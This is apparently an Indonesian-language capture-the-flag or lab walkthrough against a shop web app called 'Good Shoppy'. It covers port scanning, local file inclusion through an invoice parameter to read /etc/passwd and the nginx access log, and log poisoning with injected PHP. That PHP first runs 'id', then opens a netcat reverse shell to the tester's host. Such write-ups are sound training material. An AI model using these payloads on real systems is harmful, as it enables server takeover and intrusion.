scan dengan rustscan
```
...
Open 172.20.1.155:80
...
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Good Shoppy;
```

get parameter untuk display invoice, bisa dilihat di inspect element, jawabannya `invoice`

payload untuk LFI `../../../../etc/passwd`

LFI = Local File Inclusion

default path ke nginx log, bisa dicari pakai `../../../../var/log/nginx/access.log`

IP address yang pertama kali akses ke site, nginx log handled oleh service logrotate, dimana akan terjadi backup pada log, dan archive log tersebut, dll. logrotate service menambahkan angka dibelakang old log files. contoh `access.log.1`, `access.log.2`, ...

coba untuk log poisoning. 
```
nc 172.20.1.155 80
GET  /<?php passthru('id'); ?> HTTP/1.1                            
Host: 172.20.1.155
Connection: close
```
lalu coba untuk refresh logfile `view-source:http://172.20.1.155/show-invoice.php?invoice=../../../../var/log/nginx/access.log`

kita akan melihat
```
10.8.2.88 - - [15/Feb/2024:01:11:07 -0500] "Get /uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

selanjutnya kita coba ubah payload
```
nc 172.20.1.155 80
GET  /<?php passthru('nc -e /bin/sh 10.8.2.88 2222'); ?> HTTP/1.1
Host: 172.20.1.155
Connection: close
```
selanjutnya buat listening `ncat -lvnp 2222`, dan kita reload logfile di web, kita akan mendapat shell.
